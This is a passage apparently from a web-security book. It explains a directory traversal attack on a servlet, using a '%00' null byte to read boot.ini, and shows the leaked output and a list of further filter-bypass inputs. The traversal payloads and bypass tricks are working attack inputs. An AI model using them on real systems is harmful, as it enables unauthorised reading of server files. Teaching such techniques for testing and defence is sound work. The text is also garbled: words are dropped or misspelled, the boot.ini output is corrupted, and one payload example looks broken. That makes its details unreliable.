We now install the full path of the application. Additionally, we discover
the login.html file is appended by default. This makes sense, since the application might
eed a default template if no user.html argument is passed. The login.html file, however,
gets in the way of a good and proper directory traversal. To get around this, we'll
an old trick that started across Perl-based scripts: For example:

```
$ /getit.sh www.victim .com \
> /servlet/webacc?user.html=../../../../../../../boot.ini%00
[boot
loader]
default-multi(0) disk(0) disk(0) partition(5)\WINNT
[operating systems]
multi(0) disk(0) disk(0) partition(5)\WINNT="WIN2K" /fastdetect /noguit
C:BOOTSYS.BSD=OpenBSD
CBOOTSYS.LNX="Linux"
C:\CMDCONS\BOOTSYS.DAT="Recovery Console" /cmdcons
```

The trick is appending "%00" to the user.html argument. The %00 is the URL-encoded
representation of the null character, that is nothing. The null character has a special meaning
in many programming languages used with string variables. A string is really an
arrary long array of characters. In order for the programming language to know
a string ends, it must use a special character to delimit it in memory, the null character,
%00. So, the servlet interprets the argument, it might still append "login.ht"
tuning the entire argument into "../../../../../../../boot.ini%00" value.
A programming language like Perl actually uses null characters within a string; it does
n't use them as a delimiter. When a language like Perl, or Java in this case, passes
the string to an operating system function, such opening a file to read, the operating
system function ignores everything past the %00 delimiter.

Forcing an application into accessing binary files sometimes takes more tricks
than using the %00. Here are some favorites:

+   - ...file.asp%0jpg The application performs rudimentary name validation
that requires an image suffix (.jpg or .gif)
- ...file.asp%0a The newline character works just like the null.
- /valid_dir/../file.asp The application performs rudimentary name
validation on the source of the file. It must be within a valid directory. Or
if does not remove directory traversal characters, then you can easily
escape the directory.
